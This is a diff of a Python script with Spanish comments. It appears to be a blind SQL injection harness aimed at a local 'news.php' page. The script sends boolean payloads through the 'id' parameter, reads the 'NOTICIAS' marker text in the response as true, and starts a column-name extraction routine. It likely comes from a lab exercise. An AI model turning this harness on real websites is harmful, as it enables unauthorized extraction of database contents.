@@ -1,20 +1,18 @@
 import requests
 import string
 
-URL = "http://localhost/news.php"
-INYECTABLE_PARAM = "id"
-
-TRUE_TEXT = "NOTICIAS"   # texto cuando la condición es TRUE
-
 def condiccion_logica(condition):
     """
     Lanza una petición con una condición booleana
     y devuelve True / False según la respuesta
     """
     payload = condition  # <-- aquí va tu payload blind
-    r = requests.get(URL, params={INYECTABLE_PARAM: payload})
+    r = requests.get("http://localhost/news.php", params={"id": payload})
 
-    return TRUE_TEXT in r.text
+    if "NOTICIAS" in r.text:
+        return True
+    else:
+        return False
 
 def extrae_nombre_columnas(max_columns=10, max_len=20):
     columns = []
